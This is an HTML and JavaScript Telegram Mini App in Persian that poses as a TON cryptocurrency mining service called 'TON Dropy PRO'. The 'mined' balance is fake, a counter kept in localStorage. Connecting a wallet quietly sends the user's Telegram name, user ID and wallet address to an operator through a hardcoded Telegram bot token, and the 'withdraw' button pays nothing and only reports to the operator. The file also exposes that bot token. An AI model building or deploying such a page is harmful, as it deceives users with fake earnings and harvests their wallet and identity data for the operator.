<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy PRO - Final v6</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        
        body {
            margin: 0; font-family: 'Vazirmatn', sans-serif;
            background: #0f172a; color: #fff; padding: 20px;
            user-select: none; direction: rtl;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 20px; border-radius: 24px;
            margin-bottom: 15px; text-align: center;
        }

        #balance {
            font-size: 38px; font-weight: 800; color: #00c6ff;
            display: block; margin: 10px 0;
            text-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
        }

        button {
            width: 100%; padding: 16px; border-radius: 18px;
            border: none; font-size: 16px; font-weight: 700;
            cursor: pointer; transition: 0.3s;
        }

        #connectBtn { background: #0088cc; color: #fff; margin-bottom: 10px; }
        #connectBtn.connected { background: #1faa59; }

        .withdraw-btn {
            background: linear-gradient(90deg, #ff512f, #dd2476);
            color: #fff;
        }

        .address-text {
            word-break: break-all; font-size: 11px;
            color: #aaa; margin-top: 10px; background: rgba(0,0,0,0.2);
            padding: 8px; border-radius: 10px;
        }

        .hidden { display: none; }

        /* Notification Toast */
        .notify {
            position: fixed; bottom: 30px; left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #00c6ff; color: #000; padding: 12px 25px;
            border-radius: 50px; font-weight: bold; transition: 0.5s;
            opacity: 0; z-index: 1000;
        }
        .notify.show { opacity: 1; transform: translateX(-50%) translateY(0); }
    </style>
</head>
<body>

<div class="header" style="text-align: center; margin-bottom: 20px;">
    <h2 style="color: #00c6ff;">TON Dropy PRO ⛏</h2>
</div>

<div class="card">
    <p style="margin:0; color:#ccc;">موجودی استخراج شده</p>
    <span id="balance">0.000000</span>
    <div style="font-size:12px; color:#aaa;">⚡ سرعت: 0.000012 TON/s</div>
</div>

<div class="card">
    <button id="connectBtn">
        <i class="fas fa-wallet"></i> اتصال به کیف پول
    </button>

    <div id="addressContainer" class="hidden">
        <div class="address-text" id="currentAddress"></div>
    </div>
</div>

<div class="card">
    <button class="withdraw-btn" id="withdrawBtn">
        <i class="fas fa-paper-plane"></i> ثبت درخواست برداشت
    </button>
</div>

<div id="notify" class="notify"></div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// تنظیمات ربات تو
const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";

/* ================= DATA & MINING ================= */
let balance = parseFloat(localStorage.getItem('mining_bal')) || 0.0;

setInterval(() => {
    balance += 0.000012;
    document.getElementById("balance").innerText = balance.toFixed(6);
    localStorage.setItem('mining_bal', balance.toString());
}, 1000);

/* ================= NOTIFY ================= */
function showNotification(text) {
    const notify = document.getElementById('notify');
    notify.textContent = text;
    notify.classList.add('show');
    setTimeout(() => notify.classList.remove('show'), 3000);
}

/* ================= TELEGRAM REPORT ================= */
async function sendToTelegram(msg) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
        });
    } catch (e) { console.warn('Send failed'); }
}

/* ================= TON CONNECT ================= */
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    // آدرس دقیق مانیفست روی گیت‌هاب تو
    manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-mining/tonconnect-manifest.json',
    buttonRootId: 'ton-connect-button' // این مورد در کد جدید تو با listener مدیریت می‌شود
});

const connectBtn = document.getElementById('connectBtn');
const addressContainer = document.getElementById('addressContainer');
const addressBox = document.getElementById('currentAddress');

// اجرای اتصال از کد تو
connectBtn.addEventListener('click', async () => {
    if (tonConnectUI.connected) {
        await tonConnectUI.disconnect();
    } else {
        try {
            await tonConnectUI.connectWallet();
        } catch {
            showNotification('اتصال لغو شد ❌');
        }
    }
});

tonConnectUI.onStatusChange(wallet => {
    if (!wallet) {
        connectBtn.innerHTML = '<i class="fas fa-wallet"></i> اتصال به کیف پول';
        connectBtn.classList.remove('connected');
        addressContainer.classList.add('hidden');
        return;
    }

    const addr = wallet.account.address;
    const short = `${addr.slice(0,4)}...${addr.slice(-4)}`;

    connectBtn.innerHTML = `<i class="fas fa-check"></i> ${short}`;
    connectBtn.classList.add('connected');
    addressBox.textContent = addr;
    addressContainer.classList.remove('hidden');

    showNotification('کیف پول متصل شد ✅');
    
    const user = tg.initDataUnsafe?.user;
    sendToTelegram(`✅ <b>اتصال کیف پول!</b>\n👤 کاربر: ${user?.first_name}\n🆔 آیدی: ${user?.id}\n👛 آدرس: <code>${addr}</code>`);
});

/* ================= WITHDRAW ================= */
document.getElementById('withdrawBtn').addEventListener('click', () => {
    if (!tonConnectUI.connected) {
        showNotification('اول کیف پول رو وصل کن! ⚠️');
        return;
    }

    const user = tg.initDataUnsafe?.user;
    const addr = tonConnectUI.account.address;
    
    sendToTelegram(`💰 <b>درخواست برداشت!</b>\n👤 کاربر: ${user?.first_name}\n💵 مقدار: ${balance.toFixed(6)} TON\n👛 آدرس: <code>${addr}</code>`);

    showNotification('درخواست با موفقیت ارسال شد ✅');
    balance = 0;
    localStorage.setItem('mining_bal', '0');
});
</script>

</body>
</html>
